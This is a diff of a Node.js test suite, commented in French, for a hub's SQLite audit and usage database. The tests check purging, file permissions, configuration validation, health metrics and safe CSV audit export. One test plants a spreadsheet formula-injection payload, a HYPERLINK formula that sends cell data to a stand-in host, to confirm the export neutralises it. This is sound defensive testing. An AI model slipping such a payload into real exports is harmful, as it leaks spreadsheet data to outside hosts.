@@ -3,7 +3,7 @@
 // réel : compteurs et audit à chaque appel d'outil, disponibilité dans /api/status et la supervision, outil d'administration.
 import { test, before, after } from "node:test";
 import assert from "node:assert/strict";
-import { mkdtempSync, writeFileSync, readFileSync, rmSync, existsSync } from "node:fs";
+import { mkdtempSync, writeFileSync, readFileSync, rmSync, existsSync, statSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { execFileSync } from "node:child_process";
@@ -25,7 +25,7 @@ test("Schéma versionné : base créée, migrations appliquées une fois, réouv
   db.close();
   assert.equal(db.open(), true);
   const raw = new DatabaseSync(db.FILE, { readOnly: true });
-  assert.equal(raw.prepare("pragma user_version").get().user_version, 1);
+  assert.equal(raw.prepare("pragma user_version").get().user_version, db.MIGRATIONS.length);
   assert.equal(raw.prepare("pragma journal_mode").get().journal_mode, "wal");
   raw.close();
   assert.equal(db.usage("2026-10").systems[0].calls, 1);
@@ -64,8 +64,9 @@ test("Audit : e-mail chiffré au repos, déchiffré pour l'administrateur ; jama
 test("Purge : historique de plus de 90 jours, usage de plus de 24 mois, audit au-delà d'AUDIT_DAYS", () => {
   db.sample("sagex3", "ok", 1, NOW - 100 * DAY);
   db.count("sagex3", "vieux", false, Date.UTC(2024, 0, 15));
-  db.audit({ user: "u9", who: null, system: "sagex3", tool: "sagex3_get", outcome: "ok", ms: 1, at: NOW - 120 * DAY });
+  db.audit({ user: "pseudo-purge-9xq", who: null, system: "sagex3", tool: "sagex3_get", outcome: "ok", ms: 1, at: NOW - 120 * DAY });
   db.purge(NOW);
+  for (const f of [db.FILE, `${db.FILE}-wal`]) if (existsSync(f)) assert.ok(!readFileSync(f).includes("pseudo-purge-9xq"), `ligne purgée effacée du fichier ${f}, pas seulement marquée libre`);
   const raw = new DatabaseSync(db.FILE, { readOnly: true });
   assert.equal(raw.prepare("select count(*) n from availability where at < ?").get(NOW - 90 * DAY).n, 0);
   assert.equal(raw.prepare("select count(*) n from usage where month = '2024-01'").get().n, 0);
@@ -80,6 +81,28 @@ test("Instantané : fichier SQLite complet et cohérent, publié atomiquement", 
   assert.ok(!existsSync(`${db.SNAPSHOT}.tmp`));
   const copy = new DatabaseSync(db.SNAPSHOT, { readOnly: true });
   assert.equal(copy.prepare("select count(*) n from audit").get().n, 1); copy.close();
+  for (const f of [db.FILE, db.SNAPSHOT]) assert.equal(statSync(f).mode & 0o777, 0o600, `${f} lisible par le seul utilisateur du hub`);
+});
+
+test("AUDIT_DAYS illisible avec l'audit actif : refus de démarrer (sinon la purge ne supprimerait plus rien, sans un mot)", () => {
+  for (const v of ["abc", "30j", "0", "-5"]) {
+    let err;
+    try { execFileSync(process.execPath, ["-e", `import(${JSON.stringify(join(HUB_DIR, "db.js"))})`], { env: { ...process.env, AUDIT_DAYS: v }, encoding: "utf8", stdio: "pipe" }); } catch (e) { err = e; }
+    assert.equal(err?.status, 1, v); assert.match(err.stderr, /AUDIT_DAYS invalide/);
+  }
+  execFileSync(process.execPath, ["-e", `import(${JSON.stringify(join(HUB_DIR, "db.js"))})`], { env: { ...process.env, AUDIT: "", AUDIT_DAYS: "abc" }, stdio: "pipe" }); // sans audit : sans effet, le hub démarre
+});
+
+test("Export d'audit : formules de tableur neutralisées, option vide refusée, lecture seule", () => {
+  db.audit({ user: "-pseudo", who: '=HYPERLINK("http://x/?"&A1;"clic")@ex.fr', system: "sagex3", tool: "sagex3_query", outcome: "ok", ms: 3, at: NOW });
+  const env = { ...process.env, DATA_DIR: DIR, ENCRYPTION_KEY };
+  const out = execFileSync(process.execPath, [join(HUB_DIR, "admin.js"), "audit", "--depuis", "2026-10-25", "--jusqua", "2026-10-25"], { env, encoding: "utf8" });
+  const line = out.split("\n").find((l) => l.includes("HYPERLINK"));
+  assert.ok(line.includes(`"'=HYPERLINK`) && line.includes(";'-pseudo;"), line);
+  let err; try { execFileSync(process.execPath, [join(HUB_DIR, "admin.js"), "audit", "--collaborateur", ""], { env, stdio: "pipe" }); } catch (e) { err = e; }
+  assert.equal(err?.status, 1, "--collaborateur vide : refus, jamais tout le journal");
+  const version = new DatabaseSync(db.FILE, { readOnly: true }).prepare("pragma user_version").get().user_version;
+  assert.equal(version, db.MIGRATIONS.length);
 });
 
 test("Base illisible : le hub continue sans historique ni compteurs, sans jamais faire échouer un appel", () => {
@@ -88,6 +111,7 @@ test("Base illisible : le hub continue sans historique ni compteurs, sans jamais
   assert.equal(db.open(bad), false);
   const torn = join(DIR, "dechiree.db"); writeFileSync(torn, Buffer.concat([Buffer.from("SQLite format 3\0"), Buffer.alloc(4000, 7)])); // en-tête correct, contenu abîmé
   assert.equal(db.open(torn), false);
+  assert.equal(db.health().up, false, "visible par la supervision (clevoa_hub_db_up 0)");
   assert.equal(db.ready(), false);
   assert.equal(db.count("sagex3", "u1", false), undefined);
   assert.deepEqual(db.availability("sagex3"), { pct: null, samples: 0, days: 30 });
@@ -129,11 +153,12 @@ test("Hub : chaque appel d'outil compte dans l'usage du mois et, avec AUDIT=on, 
   assert.match(usage, /1 collaborateur\(s\) actif\(s\)/); assert.match(usage, /sagex3\s+1 appels/);
   const audit = execFileSync(process.execPath, [join(HUB_DIR, "admin.js"), "audit"], { env, encoding: "utf8" }).trim().split("\n");
   assert.equal(audit[0], "date;collaborateur;pseudonyme;systeme;outil;resultat;duree_ms");
-  assert.match(audit[1], /;alice@example\.com;[\w-]{22};sagex3;sagex3_representations;ok;\d+$/);
+  assert.match(audit[1], /;alice@example\.com;[0-9a-f]{24};sagex3;sagex3_representations;ok;\d+$/);
   const dispo = execFileSync(process.execPath, [join(HUB_DIR, "admin.js"), "disponibilite"], { env, encoding: "utf8" });
   assert.match(dispo, /sagex3\s+91\.7 %/);
   const prom = await (await fetch(`${hub.url}/metrics`, { headers: { Authorization: `Bearer ${TOKEN}` } })).text();
   assert.match(prom, /clevoa_usage_month_active_users\{month="\d{4}-\d{2}"\} 1/);
+  assert.match(prom, /^clevoa_hub_db_up 1$/m); assert.match(prom, /^clevoa_hub_db_write_failures_total 0$/m);
   assert.doesNotMatch(hub.logs(), /alice@example\.com/, "jamais d'identité dans les journaux");
 });
 
